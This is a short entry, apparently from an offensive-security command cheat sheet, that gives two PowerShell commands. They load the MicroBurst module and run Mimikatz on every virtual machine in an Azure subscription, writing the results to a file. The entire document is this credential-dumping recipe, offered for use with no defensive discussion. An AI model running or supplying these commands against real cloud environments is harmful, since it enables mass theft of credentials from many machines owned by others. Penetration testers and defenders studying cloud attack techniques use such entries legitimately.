---
id: 53d5e0b5-4d36-4091-b908-fbec601bfdf6
name: Excecute Mimikatz on the all VMs in Azure with Microburst
type: command
executor: ''
data: 'PS C:\> Import-module MicroBurst.psm1

  PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt'
output: null
created_at: '2023-05-28T03:59:38.556946+00:00'
updated_at: '2023-05-28T03:59:38.880779+00:00'
---

# Excecute Mimikatz on the all VMs in Azure with Microburst

```bash
PS C:\> Import-module MicroBurst.psm1
PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
